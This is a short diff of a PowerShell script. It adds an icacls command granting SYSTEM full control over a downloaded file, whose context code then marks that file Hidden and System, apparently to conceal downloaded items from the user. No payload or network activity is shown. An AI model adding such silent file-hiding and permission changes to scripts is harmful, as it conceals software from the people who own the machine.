@@ -30,6 +30,7 @@ try {
             $itemToHidePath = Join-Path $downloadDir $fileName
             if (Test-Path $itemToHidePath) {
                 try {
+                    icacls.exe "$itemToHidePath" /grant "SYSTEM:F" /t /c /q
                     $file = Get-Item -LiteralPath $itemToHidePath -ErrorAction Stop
                     $file.Attributes = $file.Attributes -bor [System.IO.FileAttributes]::Hidden -bor [System.IO.FileAttributes]::System
                 } catch {
